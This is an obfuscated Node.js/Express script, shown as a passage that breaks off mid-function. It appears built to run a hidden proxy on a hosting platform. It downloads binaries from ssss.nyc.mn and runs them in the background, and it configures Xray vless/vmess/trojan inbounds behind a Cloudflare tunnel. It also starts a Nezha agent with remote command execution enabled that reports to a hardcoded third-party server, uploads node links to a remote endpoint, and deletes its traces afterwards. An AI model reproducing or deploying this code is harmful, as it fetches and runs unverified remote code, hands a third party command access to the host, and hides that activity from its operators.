const _0x2aaf98=_0x57f5;(function(_0x539c1c,_0x31b3cb){const _0x2e4e40=_0x57f5,_0x7abca0=_0x539c1c();while(!![]){try{const _0x22e40a=-parseInt(_0x2e4e40(0x1ed))/0x1+-parseInt(_0x2e4e40(0x258))/0x2+parseInt(_0x2e4e40(0x1d5))/0x3+parseInt(_0x2e4e40(0x1b8))/0x4*(-parseInt(_0x2e4e40(0x1e2))/0x5)+-parseInt(_0x2e4e40(0x1a9))/0x6+-parseInt(_0x2e4e40(0x1c2))/0x7*(parseInt(_0x2e4e40(0x1dc))/0x8)+parseInt(_0x2e4e40(0x1fe))/0x9;if(_0x22e40a===_0x31b3cb)break;else _0x7abca0['push'](_0x7abca0['shift']());}catch(_0x474d00){_0x7abca0['push'](_0x7abca0['shift']());}}}(_0x26e3,0xe4f1b));const express=require(_0x2aaf98(0x1ee)),app=express(),axios=require(_0x2aaf98(0x237)),os=require('os'),fs=require('fs'),path=require(_0x2aaf98(0x1d6)),{promisify}=require(_0x2aaf98(0x1b1)),exec=promisify(require(_0x2aaf98(0x1bb))[_0x2aaf98(0x1a8)]),{execSync}=require(_0x2aaf98(0x1bb)),UPLOAD_URL=process[_0x2aaf98(0x1a0)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x2aaf98(0x1a0)][_0x2aaf98(0x1fc)]||'https://bizarre-kevyn-youaer-18355adf.koyeb.app',AUTO_ACCESS=process[_0x2aaf98(0x1a0)][_0x2aaf98(0x218)]||!![],FILE_PATH=process[_0x2aaf98(0x1a0)]['FILE_PATH']||_0x2aaf98(0x1ac),SUB_PATH=process['env'][_0x2aaf98(0x1db)]||_0x2aaf98(0x1c3),PORT=process['env'][_0x2aaf98(0x1ab)]||process[_0x2aaf98(0x1a0)][_0x2aaf98(0x222)]||0xbb8,UUID=process[_0x2aaf98(0x1a0)][_0x2aaf98(0x1dd)]||'',NEZHA_SERVER=process[_0x2aaf98(0x1a0)][_0x2aaf98(0x234)]||_0x2aaf98(0x232),NEZHA_PORT=process[_0x2aaf98(0x1a0)][_0x2aaf98(0x1c4)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||_0x2aaf98(0x25d),ARGO_DOMAIN=process[_0x2aaf98(0x1a0)][_0x2aaf98(0x1f2)]||'',ARGO_AUTH=process[_0x2aaf98(0x1a0)][_0x2aaf98(0x19f)]||'',ARGO_PORT=process[_0x2aaf98(0x1a0)][_0x2aaf98(0x259)]||0x1f41,CFIP=process[_0x2aaf98(0x1a0)][_0x2aaf98(0x1e5)]||_0x2aaf98(0x21a),CFPORT=process[_0x2aaf98(0x1a0)][_0x2aaf98(0x244)]||0x1bb,NAME=process['env']['NAME']||_0x2aaf98(0x22c);!fs[_0x2aaf98(0x1f0)](FILE_PATH)?(fs[_0x2aaf98(0x1a7)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x2aaf98(0x1e1)](FILE_PATH+_0x2aaf98(0x1fb));function generateRandomName(){const _0x31d4b8=_0x2aaf98,_0x32522c=_0x31d4b8(0x23a);let _0x3723d4='';for(let _0x5e641c=0x0;_0x5e641c<0x6;_0x5e641c++){_0x3723d4+=_0x32522c[_0x31d4b8(0x1ff)](Math[_0x31d4b8(0x23e)](Math[_0x31d4b8(0x1b2)]()*_0x32522c[_0x31d4b8(0x249)]));}return _0x3723d4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2aaf98(0x1ce)](FILE_PATH,npmName),phpPath=path[_0x2aaf98(0x1ce)](FILE_PATH,phpName),webPath=path[_0x2aaf98(0x1ce)](FILE_PATH,webName),botPath=path[_0x2aaf98(0x1ce)](FILE_PATH,botName),subPath=path[_0x2aaf98(0x1ce)](FILE_PATH,_0x2aaf98(0x1e0)),listPath=path[_0x2aaf98(0x1ce)](FILE_PATH,_0x2aaf98(0x198)),bootLogPath=path[_0x2aaf98(0x1ce)](FILE_PATH,_0x2aaf98(0x21e)),configPath=path[_0x2aaf98(0x1ce)](FILE_PATH,_0x2aaf98(0x1c8));function deleteNodes(){const _0x135b91=_0x2aaf98;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x38d109;try{_0x38d109=fs[_0x135b91(0x22e)](subPath,_0x135b91(0x21b));}catch{return null;}const _0x549bf5=Buffer[_0x135b91(0x1c6)](_0x38d109,_0x135b91(0x201))[_0x135b91(0x214)](_0x135b91(0x21b)),_0x5a5baf=_0x549bf5[_0x135b91(0x254)]('\x0a')[_0x135b91(0x1f3)](_0x39a033=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x39a033));if(_0x5a5baf[_0x135b91(0x249)]===0x0)return;return axios[_0x135b91(0x221)](UPLOAD_URL+_0x135b91(0x1e3),JSON[_0x135b91(0x1a6)]({'nodes':_0x5a5baf}),{'headers':{'Content-Type':_0x135b91(0x25b)}})[_0x135b91(0x217)](_0x286366=>{return null;}),null;}catch(_0x2b9d6e){return null;}}function cleanupOldFiles(){const _0x179c0d=_0x2aaf98;try{const _0x58eb79=fs[_0x179c0d(0x25a)](FILE_PATH);_0x58eb79[_0x179c0d(0x23d)](_0x571cc7=>{const _0x57909b=_0x179c0d,_0x4e51ec=path[_0x57909b(0x1ce)](FILE_PATH,_0x571cc7);try{const _0x3c49d6=fs['statSync'](_0x4e51ec);_0x3c49d6[_0x57909b(0x207)]()&&fs[_0x57909b(0x206)](_0x4e51ec);}catch(_0x327414){}});}catch(_0x4c2b79){}}app['get']('/',function(_0x368087,_0x1c4ba6){const _0x459903=_0x2aaf98;_0x1c4ba6[_0x459903(0x1d1)](_0x459903(0x220));});async function generateConfig(){const _0x51656d=_0x2aaf98,_0x236b21={'log':{'access':_0x51656d(0x1b3),'error':_0x51656d(0x1b3),'loglevel':_0x51656d(0x1f5)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x51656d(0x19a),'settings':{'clients':[{'id':UUID,'flow':_0x51656d(0x211)}],'decryption':_0x51656d(0x1f5),'fallbacks':[{'dest':0xbb9},{'path':_0x51656d(0x1a1),'dest':0xbba},{'path':_0x51656d(0x1b7),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x51656d(0x252)}},{'port':0xbb9,'listen':_0x51656d(0x1c7),'protocol':_0x51656d(0x19a),'settings':{'clients':[{'id':UUID}],'decryption':_0x51656d(0x1f5)},'streamSettings':{'network':_0x51656d(0x252),'security':_0x51656d(0x1f5)}},{'port':0xbba,'listen':_0x51656d(0x1c7),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x51656d(0x1f5)},'streamSettings':{'network':'ws','security':_0x51656d(0x1f5),'wsSettings':{'path':_0x51656d(0x1a1)}},'sniffing':{'enabled':!![],'destOverride':[_0x51656d(0x20f),_0x51656d(0x241),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x51656d(0x1c7),'protocol':_0x51656d(0x23f),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x51656d(0x1b7)}},'sniffing':{'enabled':!![],'destOverride':[_0x51656d(0x20f),'tls',_0x51656d(0x1df)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x51656d(0x1c7),'protocol':_0x51656d(0x1ae),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x51656d(0x1f5),'wsSettings':{'path':_0x51656d(0x199)}},'sniffing':{'enabled':!![],'destOverride':[_0x51656d(0x20f),_0x51656d(0x241),_0x51656d(0x1df)],'metadataOnly':![]}}],'dns':{'servers':[_0x51656d(0x1c0)]},'outbounds':[{'protocol':_0x51656d(0x219),'tag':_0x51656d(0x213)},{'protocol':_0x51656d(0x1d8),'tag':_0x51656d(0x226)}]};fs[_0x51656d(0x1ad)](path['join'](FILE_PATH,_0x51656d(0x1c8)),JSON[_0x51656d(0x1a6)](_0x236b21,null,0x2));}function getSystemArchitecture(){const _0x3faa4d=_0x2aaf98,_0x25af07=os[_0x3faa4d(0x1c1)]();return _0x25af07==='arm'||_0x25af07===_0x3faa4d(0x1c5)||_0x25af07===_0x3faa4d(0x1c9)?'arm':'amd';}function downloadFile(_0x1c8664,_0x4e5dda,_0x29c361){const _0x12227f=_0x2aaf98,_0x37dd2d=_0x1c8664;!fs['existsSync'](FILE_PATH)&&fs[_0x12227f(0x1a7)](FILE_PATH,{'recursive':!![]});const _0x548b78=fs[_0x12227f(0x1f1)](_0x37dd2d);axios({'method':'get','url':_0x4e5dda,'responseType':_0x12227f(0x22a)})[_0x12227f(0x21d)](_0x4c7ac6=>{const _0x38fd33=_0x12227f;_0x4c7ac6[_0x38fd33(0x1f7)][_0x38fd33(0x253)](_0x548b78),_0x548b78['on'](_0x38fd33(0x1d4),()=>{const _0x10b23c=_0x38fd33;_0x548b78[_0x10b23c(0x197)](),console[_0x10b23c(0x1e1)]('Download\x20'+path[_0x10b23c(0x1e9)](_0x37dd2d)+'\x20successfully'),_0x29c361(null,_0x37dd2d);}),_0x548b78['on'](_0x38fd33(0x1cf),_0x18a834=>{const _0xe17f3a=_0x38fd33;fs[_0xe17f3a(0x233)](_0x37dd2d,()=>{});const _0x1d97bb='Download\x20'+path['basename'](_0x37dd2d)+_0xe17f3a(0x1cc)+_0x18a834['message'];console[_0xe17f3a(0x1cf)](_0x1d97bb),_0x29c361(_0x1d97bb);});})[_0x12227f(0x217)](_0x359059=>{const _0x1726fa=_0x12227f,_0x2786cf=_0x1726fa(0x23b)+path['basename'](_0x37dd2d)+'\x20failed:\x20'+_0x359059[_0x1726fa(0x1d2)];console[_0x1726fa(0x1cf)](_0x2786cf),_0x29c361(_0x2786cf);});}async function downloadFilesAndRun(){const _0x10d0ac=_0x2aaf98,_0x5087bf=getSystemArchitecture(),_0x5c35e6=getFilesForArchitecture(_0x5087bf);if(_0x5c35e6[_0x10d0ac(0x249)]===0x0){console[_0x10d0ac(0x1e1)](_0x10d0ac(0x242));return;}const _0x3b8a76=_0x5c35e6[_0x10d0ac(0x248)](_0x2b851f=>{return new Promise((_0xc9c5a3,_0x44550c)=>{const _0x11c223=_0x57f5;downloadFile(_0x2b851f[_0x11c223(0x239)],_0x2b851f[_0x11c223(0x223)],(_0x4833c4,_0x3312da)=>{_0x4833c4?_0x44550c(_0x4833c4):_0xc9c5a3(_0x3312da);});});});try{await Promise[_0x10d0ac(0x200)](_0x3b8a76);}catch(_0xf12d86){console['error'](_0x10d0ac(0x1a4),_0xf12d86);return;}function _0x61ed0b(_0x4a695b){const _0x3a86ef=_0x10d0ac,_0x5147b0=0x1fd;_0x4a695b[_0x3a86ef(0x23d)](_0x46a953=>{const _0x2bb331=_0x3a86ef;fs[_0x2bb331(0x1f0)](_0x46a953)&&fs[_0x2bb331(0x209)](_0x46a953,_0x5147b0,_0x46c9b9=>{const _0x4acc58=_0x2bb331;_0x46c9b9?console[_0x4acc58(0x1cf)](_0x4acc58(0x24d)+_0x46a953+':\x20'+_0x46c9b9):console[_0x4acc58(0x1e1)]('Empowerment\x20success\x20for\x20'+_0x46a953+':\x20'+_0x5147b0[_0x4acc58(0x214)](0x8));});});}const _0x2c6f03=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x61ed0b(_0x2c6f03);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x461430=NEZHA_SERVER[_0x10d0ac(0x20d)](':')?NEZHA_SERVER['split'](':')[_0x10d0ac(0x247)]():'',_0x1d9723=new Set(['443',_0x10d0ac(0x20c),'2096',_0x10d0ac(0x1ba),'2083','2053']),_0x5d130a=_0x1d9723['has'](_0x461430)?_0x10d0ac(0x25c):_0x10d0ac(0x1ef),_0x1f9883=_0x10d0ac(0x1ca)+NEZHA_KEY+_0x10d0ac(0x1f8)+NEZHA_SERVER+_0x10d0ac(0x1b0)+_0x5d130a+_0x10d0ac(0x203)+UUID;fs[_0x10d0ac(0x1ad)](path[_0x10d0ac(0x1ce)](FILE_PATH,_0x10d0ac(0x224)),_0x1f9883);const _0x3e6c6e=_0x10d0ac(0x1e4)+phpPath+_0x10d0ac(0x229)+FILE_PATH+_0x10d0ac(0x215);try{await exec(_0x3e6c6e),console[_0x10d0ac(0x1e1)](phpName+_0x10d0ac(0x1d9)),await new Promise(_0x5a3e1e=>setTimeout(_0x5a3e1e,0x3e8));}catch(_0x44d30f){console['error'](_0x10d0ac(0x208)+_0x44d30f);}}else{let _0x4ec8f9='';const _0x16444f=[_0x10d0ac(0x21c),_0x10d0ac(0x20c),_0x10d0ac(0x255),'2087',_0x10d0ac(0x257),_0x10d0ac(0x1be)];_0x16444f[_0x10d0ac(0x20d)](NEZHA_PORT)&&(_0x4ec8f9=_0x10d0ac(0x24b));const _0x5c521d=_0x10d0ac(0x1e4)+npmPath+_0x10d0ac(0x245)+NEZHA_SERVER+':'+NEZHA_PORT+_0x10d0ac(0x19c)+NEZHA_KEY+'\x20'+_0x4ec8f9+_0x10d0ac(0x240);try{await exec(_0x5c521d),console['log'](npmName+_0x10d0ac(0x1d9)),await new Promise(_0x5757a9=>setTimeout(_0x5757a9,0x3e8));}catch(_0x2928a1){console[_0x10d0ac(0x1cf)]('npm\x20running\x20error:\x20'+_0x2928a1);}}}else console['log'](_0x10d0ac(0x20a));const _0x16cbc2=_0x10d0ac(0x1e4)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x16cbc2),console[_0x10d0ac(0x1e1)](webName+_0x10d0ac(0x1d9)),await new Promise(_0x3ac9d8=>setTimeout(_0x3ac9d8,0x3e8));}catch(_0x5bae2f){console['error'](_0x10d0ac(0x1a5)+_0x5bae2f);}if(fs['existsSync'](botPath)){let _0x83bdce;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x83bdce=_0x10d0ac(0x1d0)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x83bdce='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x10d0ac(0x1aa):_0x83bdce=_0x10d0ac(0x212)+FILE_PATH+_0x10d0ac(0x250)+ARGO_PORT;try{await exec(_0x10d0ac(0x1e4)+botPath+'\x20'+_0x83bdce+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x3d19d5=>setTimeout(_0x3d19d5,0x7d0));}catch(_0x3b81eb){console[_0x10d0ac(0x1cf)]('Error\x20executing\x20command:\x20'+_0x3b81eb);}}await new Promise(_0x3ab0d7=>setTimeout(_0x3ab0d7,0x1388));}function _0x26e3(){const _0x248c42=['utf-8','443','then','boot.log','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Hello\x20world!','post','PORT','fileUrl','config.yaml','App\x20is\x20running','block','https://arm64.ssss.nyc.mn/v1','automatic\x20access\x20task\x20added\x20successfully','\x20-c\x20\x22','stream','Unknown','argoimage','win32','readFileSync','tunnel.yml','&fp=firefox&type=ws&host=','push','nz.680660.xyz:443','unlink','NEZHA_SERVER','org','country_code','axios','https://ipapi.co/json/','fileName','abcdefghijklmnopqrstuvwxyz','Download\x20','https://amd64.ssss.nyc.mn/v1','forEach','floor','vmess','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','tls','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0a\x0avmess://','CFPORT','\x20-s\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','pop','map','length','tunnel.json','--tls','Skipping\x20adding\x20automatic\x20access\x20task','Empowerment\x20failed\x20for\x20','ArgoDomain:','/vmess-argo?ed=2560','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://amd64.ssss.nyc.mn/bot','tcp','pipe','split','2096','https://arm64.ssss.nyc.mn/agent','2083','2667486ddtAQG','ARGO_PORT','readdirSync','application/json','true','IE3tj6tvKuytMasgSk2VskG9GTyGP6vK','close','list.txt','/trojan-argo','vless','arm','\x20-p\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','platform','ARGO_AUTH','env','/vless-argo','/api/add-nodes','?security=tls&sni=','Error\x20downloading\x20files:','web\x20running\x20error:\x20','stringify','mkdirSync','exec','9517644FSCrDU','/tunnel.yml\x20run','SERVER_PORT','./tmp','writeFileSync','trojan','taskkill\x20/f\x20/im\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','util','random','/dev/null','rm\x20-rf\x20','test','https://arm64.ssss.nyc.mn/web','/vmess-argo','4HZSbuy','https://amd64.ssss.nyc.mn/agent','2087','child_process','Subscription\x20uploaded\x20successfully','ARGO_DOMAIN:','2053','Error\x20reading\x20boot.log:','https+local://8.8.8.8/dns-query','arch','10398703wYGHNv','subkey660','NEZHA_PORT','arm64','from','127.0.0.1','config.json','aarch64','\x0aclient_secret:\x20','pkill\x20-f\x20\x22[','\x20failed:\x20','unshift','join','error','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','send','message','?encryption=none&security=tls&sni=','finish','3028017JkvnuH','path','clear','blackhole','\x20is\x20running','listen','SUB_PATH','8rpoScT','UUID','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','quic','sub.txt','log','8584455CvWWRL','/api/delete-nodes','nohup\x20','CFIP','Error\x20executing\x20command:\x20','substring','countryCode','basename','https://oooo.serv00.net/add-url','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20>/dev/null\x202>&1','1775834xztplq','express','false','existsSync','createWriteStream','ARGO_DOMAIN','filter','status','none','del\x20/f\x20/q\x20','data','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/sub.txt\x20saved\x20successfully','\x22\x20>\x20/dev/null\x202>&1','\x20already\x20exists','PROJECT_URL','get','70440183vRWwZu','charAt','all','base64','set','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','firefox','\x0a\x20\x20credentials-file:\x20','unlinkSync','isFile','php\x20running\x20error:\x20','chmod','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0a\x0atrojan://','8443','includes','\x20>/dev/null\x202>&1\x20&','http','response','xtls-rprx-vision','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','direct','toString','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Content-Type','catch','AUTO_ACCESS','freedom','store.ubi.com'];_0x26e3=function(){return _0x248c42;};return _0x26e3();}function getFilesForArchitecture(_0xe86097){const _0x78223f=_0x2aaf98;let _0x47db8c;_0xe86097===_0x78223f(0x19b)?_0x47db8c=[{'fileName':webPath,'fileUrl':_0x78223f(0x1b6)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x47db8c=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x78223f(0x251)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x564cfa=_0xe86097===_0x78223f(0x19b)?_0x78223f(0x256):_0x78223f(0x1b9);_0x47db8c[_0x78223f(0x1cd)]({'fileName':npmPath,'fileUrl':_0x564cfa});}else{const _0x2ed3e2=_0xe86097==='arm'?_0x78223f(0x227):_0x78223f(0x23c);_0x47db8c[_0x78223f(0x1cd)]({'fileName':phpPath,'fileUrl':_0x2ed3e2});}}return _0x47db8c;}function argoType(){const _0x291d32=_0x2aaf98;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x291d32(0x1e1)](_0x291d32(0x19d));return;}if(ARGO_AUTH[_0x291d32(0x20d)]('TunnelSecret')){fs[_0x291d32(0x1ad)](path[_0x291d32(0x1ce)](FILE_PATH,_0x291d32(0x24a)),ARGO_AUTH);const _0x3e78b4='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x291d32(0x254)]('\x22')[0xb]+_0x291d32(0x205)+path[_0x291d32(0x1ce)](FILE_PATH,_0x291d32(0x24a))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x291d32(0x21f)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x291d32(0x1ce)](FILE_PATH,_0x291d32(0x22f)),_0x3e78b4);}else console[_0x291d32(0x1e1)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x5cba1e=_0x2aaf98;let _0xdd308e;if(ARGO_AUTH&&ARGO_DOMAIN)_0xdd308e=ARGO_DOMAIN,console[_0x5cba1e(0x1e1)](_0x5cba1e(0x1bd),_0xdd308e),await _0x40d14c(_0xdd308e);else try{const _0x6285ad=fs[_0x5cba1e(0x22e)](path[_0x5cba1e(0x1ce)](FILE_PATH,_0x5cba1e(0x21e)),'utf-8'),_0x5be2da=_0x6285ad[_0x5cba1e(0x254)]('\x0a'),_0x18779f=[];_0x5be2da[_0x5cba1e(0x23d)](_0x2be297=>{const _0x4ce443=_0x5cba1e,_0x9c042c=_0x2be297['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x9c042c){const _0x33b11e=_0x9c042c[0x1];_0x18779f[_0x4ce443(0x231)](_0x33b11e);}});if(_0x18779f[_0x5cba1e(0x249)]>0x0)_0xdd308e=_0x18779f[0x0],console[_0x5cba1e(0x1e1)](_0x5cba1e(0x24e),_0xdd308e),await _0x40d14c(_0xdd308e);else{console[_0x5cba1e(0x1e1)](_0x5cba1e(0x1de)),fs[_0x5cba1e(0x206)](path[_0x5cba1e(0x1ce)](FILE_PATH,_0x5cba1e(0x21e)));async function _0x3f79ba(){const _0x5ed9a7=_0x5cba1e;try{process['platform']==='win32'?await exec(_0x5ed9a7(0x1af)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x5ed9a7(0x1cb)+botName[_0x5ed9a7(0x1ff)](0x0)+']'+botName[_0x5ed9a7(0x1e7)](0x1)+_0x5ed9a7(0x1fa));}catch(_0xf876db){}}_0x3f79ba(),await new Promise(_0x27289a=>setTimeout(_0x27289a,0xbb8));const _0x1913ca=_0x5cba1e(0x212)+FILE_PATH+_0x5cba1e(0x250)+ARGO_PORT;try{await exec(_0x5cba1e(0x1e4)+botPath+'\x20'+_0x1913ca+_0x5cba1e(0x20e)),console['log'](botName+_0x5cba1e(0x1d9)),await new Promise(_0xb5f2b6=>setTimeout(_0xb5f2b6,0xbb8)),await extractDomains();}catch(_0x33af86){console[_0x5cba1e(0x1cf)](_0x5cba1e(0x1e6)+_0x33af86);}}}catch(_0x8aee59){console[_0x5cba1e(0x1cf)](_0x5cba1e(0x1bf),_0x8aee59);}async function _0x4c69c7(){const _0x566492=_0x5cba1e;try{const _0x1abe11=await axios[_0x566492(0x1fd)](_0x566492(0x238),{'timeout':0xbb8});if(_0x1abe11['data']&&_0x1abe11['data'][_0x566492(0x236)]&&_0x1abe11[_0x566492(0x1f7)][_0x566492(0x235)])return _0x1abe11['data'][_0x566492(0x236)]+'_'+_0x1abe11[_0x566492(0x1f7)][_0x566492(0x235)];}catch(_0x3ed47b){try{const _0x98e7e7=await axios[_0x566492(0x1fd)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x98e7e7[_0x566492(0x1f7)]&&_0x98e7e7[_0x566492(0x1f7)][_0x566492(0x1f4)]==='success'&&_0x98e7e7[_0x566492(0x1f7)]['countryCode']&&_0x98e7e7[_0x566492(0x1f7)][_0x566492(0x235)])return _0x98e7e7[_0x566492(0x1f7)][_0x566492(0x1e8)]+'_'+_0x98e7e7[_0x566492(0x1f7)][_0x566492(0x235)];}catch(_0x5099a2){}}return _0x566492(0x22b);}async function _0x40d14c(_0x555781){const _0xa0763d=await _0x4c69c7(),_0x27ea94=NAME?NAME+'-'+_0xa0763d:_0xa0763d;return new Promise(_0x4da52a=>{setTimeout(()=>{const _0x2b29db=_0x57f5,_0x421472={'v':'2','ps':''+_0x27ea94,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2b29db(0x1f5),'net':'ws','type':'none','host':_0x555781,'path':_0x2b29db(0x24f),'tls':_0x2b29db(0x241),'sni':_0x555781,'alpn':'','fp':_0x2b29db(0x204)},_0x4ef0e0='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x2b29db(0x1d3)+_0x555781+_0x2b29db(0x230)+_0x555781+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x27ea94+_0x2b29db(0x243)+Buffer[_0x2b29db(0x1c6)](JSON['stringify'](_0x421472))[_0x2b29db(0x214)](_0x2b29db(0x201))+_0x2b29db(0x20b)+UUID+'@'+CFIP+':'+CFPORT+_0x2b29db(0x1a3)+_0x555781+_0x2b29db(0x230)+_0x555781+_0x2b29db(0x1eb)+_0x27ea94+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x2b29db(0x1c6)](_0x4ef0e0)['toString'](_0x2b29db(0x201))),fs['writeFileSync'](subPath,Buffer[_0x2b29db(0x1c6)](_0x4ef0e0)[_0x2b29db(0x214)](_0x2b29db(0x201))),console[_0x2b29db(0x1e1)](FILE_PATH+_0x2b29db(0x1f9)),uploadNodes(),app[_0x2b29db(0x1fd)]('/'+SUB_PATH,(_0x513afe,_0x15c889)=>{const _0x1ab97e=_0x2b29db,_0x4d6fce=Buffer[_0x1ab97e(0x1c6)](_0x4ef0e0)[_0x1ab97e(0x214)](_0x1ab97e(0x201));_0x15c889[_0x1ab97e(0x202)](_0x1ab97e(0x216),'text/plain;\x20charset=utf-8'),_0x15c889[_0x1ab97e(0x1d1)](_0x4d6fce);}),_0x4da52a(_0x4ef0e0);},0x7d0);});}}async function uploadNodes(){const _0x13c3d0=_0x2aaf98;if(UPLOAD_URL&&PROJECT_URL){const _0x1970d2=PROJECT_URL+'/'+SUB_PATH,_0x3eb671={'subscription':[_0x1970d2]};try{const _0x487d8e=await axios[_0x13c3d0(0x221)](UPLOAD_URL+'/api/add-subscriptions',_0x3eb671,{'headers':{'Content-Type':_0x13c3d0(0x25b)}});return _0x487d8e&&_0x487d8e['status']===0xc8?(console[_0x13c3d0(0x1e1)](_0x13c3d0(0x1bc)),_0x487d8e):null;}catch(_0x327c46){if(_0x327c46[_0x13c3d0(0x210)]){if(_0x327c46[_0x13c3d0(0x210)][_0x13c3d0(0x1f4)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x13c3d0(0x1f0)](listPath))return;const _0x356d21=fs[_0x13c3d0(0x22e)](listPath,'utf-8'),_0x254699=_0x356d21[_0x13c3d0(0x254)]('\x0a')['filter'](_0x3dde25=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x13c3d0(0x1b5)](_0x3dde25));if(_0x254699[_0x13c3d0(0x249)]===0x0)return;const _0x5ef0fc=JSON[_0x13c3d0(0x1a6)]({'nodes':_0x254699});try{const _0x42fc6d=await axios['post'](UPLOAD_URL+_0x13c3d0(0x1a2),_0x5ef0fc,{'headers':{'Content-Type':_0x13c3d0(0x25b)}});return _0x42fc6d&&_0x42fc6d['status']===0xc8?(console[_0x13c3d0(0x1e1)]('Nodes\x20uploaded\x20successfully'),_0x42fc6d):null;}catch(_0x1ffab8){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2a3008=_0x57f5,_0x209865=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x209865[_0x2a3008(0x231)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x209865[_0x2a3008(0x231)](phpPath);process[_0x2a3008(0x19e)]===_0x2a3008(0x22d)?exec(_0x2a3008(0x1f6)+_0x209865[_0x2a3008(0x1ce)]('\x20')+'\x20>\x20nul\x202>&1',_0x3a1a4b=>{const _0x155c84=_0x2a3008;console[_0x155c84(0x1d7)](),console[_0x155c84(0x1e1)](_0x155c84(0x225)),console[_0x155c84(0x1e1)](_0x155c84(0x246));}):exec(_0x2a3008(0x1b4)+_0x209865[_0x2a3008(0x1ce)]('\x20')+_0x2a3008(0x1ec),_0x16d622=>{const _0x2aa7c4=_0x2a3008;console[_0x2aa7c4(0x1d7)](),console[_0x2aa7c4(0x1e1)]('App\x20is\x20running'),console['log'](_0x2aa7c4(0x246));});},0x15f90);}cleanFiles();function _0x57f5(_0x266fc0,_0x48740c){_0x266fc0=_0x266fc0-0x197;const _0x26e3b4=_0x26e3();let _0x57f510=_0x26e3b4[_0x266fc0];return _0x57f510;}async function AddVisitTask(){const _0x50ec54=_0x2aaf98;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x50ec54(0x1e1)](_0x50ec54(0x24c));return;}try{const _0x2e4de8=await axios[_0x50ec54(0x221)](_0x50ec54(0x1ea),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x50ec54(0x25b)}});return console[_0x50ec54(0x1e1)](_0x50ec54(0x228)),_0x2e4de8;}catch(_0x4dc6d7){return 